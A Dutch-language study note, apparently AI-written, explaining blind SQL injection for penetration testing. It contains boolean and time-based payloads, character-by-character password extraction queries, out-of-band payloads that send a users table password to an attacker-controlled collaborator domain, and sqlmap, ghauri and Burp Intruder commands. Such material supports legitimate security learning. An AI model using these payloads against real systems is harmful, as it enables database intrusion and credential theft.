
Dit is de moeilijkste maar vaak ook de meest voorkomende vorm van SQL Injection. Omdat je **geen errors** en **geen data** op je scherm ziet, moet je de database "vragen stellen" (Waar/Niet Waar) om data letter voor letter te raden.

Hier is de complete Obsidian notitie voor **Blind SQL Injection**.

---

Markdown

````
# 🙈 Blind SQL Injection

==Concept: De applicatie geeft geen database errors of data terug. Je moet data extraheren door True/False vragen te stellen aan de database.==



---

## 🧠 1. Types & Detectie

Er zijn twee hoofdsmaken. Je moet eerst vaststellen welke je hebt.

### A. Boolean-Based (Content-Based)
*De pagina verandert van inhoud (of grootte) afhankelijk van of je query WAAR of NIET WAAR is.*

**Test:**
1.  `id=1 AND 1=1` -> Pagina laadt normaal (bijv. "Product gevonden").
2.  `id=1 AND 1=0` -> Pagina is leeg, mist een plaatje, of geeft "404 Not Found".

> [!TIP] Content Length
> In Burp Intruder/Repeater, kijk naar de **Content-Length** van de response. Als die verschilt tussen de `1=1` en `1=0` payload, heb je een Boolean Blind SQLi.

### B. Time-Based (Stacked Queries)
*De pagina ziet er altijd hetzelfde uit. Je dwingt de database om te **slapen** (wachten) als je query WAAR is.*

**Test:**
1.  `id=1` -> Laadt direct.
2.  `id=1 AND sleep(10)--` -> Laadt na 10 seconden? **Bingo.**

---

## ⏳ 2. Time-Based Payloads (Cheatsheet)
*Elke database heeft een eigen commando om tijd te rekken. Probeer ze allemaal.*

| Database | Payload | Opmerking |
| :--- | :--- | :--- |
| **MySQL / MariaDB** | `' AND SLEEP(10)--` | Meest voorkomend. |
| **PostgreSQL** | `'; SELECT pg_sleep(10)--` | Let op de puntkomma `;` |
| **MSSQL** | `'; WAITFOR DELAY '0:0:10'--` | Uur:Min:Sec formaat. |
| **Oracle** | `' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('RDS',10)--` | Complexer. |

**Conditional Time-Based (Vraag stellen):**
*Als de versie begint met een '5', slaap dan 10 seconden.*
```sql
id=1' AND IF(substring(version(),1,1)='5', sleep(10), 'false')--
````

---

## 🔎 3. Data Extractie (Handmatig Logic)

_Hoe steel je een wachtwoord als je niets ziet? Je raadt het letter voor letter._

**Voorbeeld Scenario (MySQL Boolean):** We willen de eerste letter van de gebruikersnaam van de admin weten.

**Vraag 1: Is de lengte van de naam groter dan 5?**

SQL

```
id=1' AND (SELECT length(username) FROM users WHERE id=1)>5--
```

_Resultaat: Pagina laadt normaal (TRUE). De naam is langer dan 5 letters._

**Vraag 2: Is de eerste letter een 'A'?**

SQL

```
id=1' AND (SELECT substring(username,1,1) FROM users WHERE id=1)='A'--
```

_Resultaat: Pagina laadt leeg (FALSE)._

**Vraag 3: Is de eerste letter een 'B'?**

SQL

```
id=1' AND (SELECT substring(username,1,1) FROM users WHERE id=1)='B'--
```

_Resultaat: Pagina laadt normaal (TRUE). Eerste letter is 'B'!_

> [!INFO] ASCII Binary Search Om dit te versnellen gebruiken tools ASCII waardes (`ascii('a') = 97`) en binary search (Is het groter dan 100? Ja/Nee).

---

## 📡 4. OOB (Out-of-Band) Exfiltration

_Blind SQLi is traag. Als de server naar buiten mag verbinden (DNS/HTTP), is dit 100x sneller._ _Je stopt de data (query resultaat) in een subdomein en stuurt een DNS request naar jouw server._

**Vereiste:** Burp Collaborator of `interactsh`.

**MySQL Payload (Windows):**

SQL

```
' UNION SELECT LOAD_FILE(concat('\\\\', (SELECT password FROM users LIMIT 1), '.jouw-collaborator.com\\abc'))--
```

**Oracle XML Payload:**

SQL

```
SELECT DBMS_LDAP.INIT((SELECT password FROM users)||'.jouw-collaborator.com',80) FROM DUAL;
```

_Je ziet het wachtwoord verschijnen in je Collaborator logs als subdomein._

---

## 🤖 5. Automation Tools

**SQLMap (De Redder)** Handmatig Blind SQLi doen is gekkenwerk. SQLMap automatiseert het "Ja/Nee" vragen.

Bash

```
# Specifiek scannen op Blind technieken (Boolean + Time)
sqlmap -u "[http://target.com?id=1](http://target.com?id=1)" --technique=BT --level=5 --risk=3 --dbs
```

**Threads verhogen (Snelheid):** Omdat Time-based traag is, wil je meer threads.

Bash

```
sqlmap -u "..." --threads 10
```

**DNS Exfiltration met SQLMap:** Als OOB mogelijk is, gebruik dit voor snelheid.

Bash

```
sqlmap -u "..." --dns-domain=jouw-collaborator.com
```

**Ghauri (Het snellere alternatief)** Een moderne tool die soms beter werkt dan SQLMap voor specifieke headers.

Bash

```
ghauri -u "[http://target.com?id=1](http://target.com?id=1)" --dbs
```

---

## 🟧 6. Burp Intruder (Semi-Auto)

_Als SQLMap geblokkeerd wordt, kun je Burp Intruder gebruiken om karakter voor karakter te bruten._

1. Stuur request naar Intruder.
    
2. Gebruik payload: `AND substring(password,1,1)='§a§'`
    
3. Zet de marker op de letter die je wilt raden.
    
4. Payload set: `a-z, 0-9`.
    
5. Start attack en kijk welke response een andere **Length** heeft.
    
6. Herhaal voor `substring(...,2,1)`, etc.
    

---

## 📝 Checklist Blind SQLi

- [ ] **Boolean Check:** Verandert de Content-Length tussen `AND 1=1` en `AND 1=0`?
    
- [ ] **Time Check:** Reageert de server trager op `sleep(10)`?
    
- [ ] **Database Type:** Heb ik specifiek payloads voor MySQL én Postgres geprobeerd?
    
- [ ] **Headers:** Heb ik de `User-Agent`, `X-Forwarded-For` en `Referer` headers getest? (Vaak vergeten plekken voor Blind SQLi).
    
- [ ] **Geduld:** Blind SQLi duurt lang. Heb ik SQLMap lang genoeg laten draaien?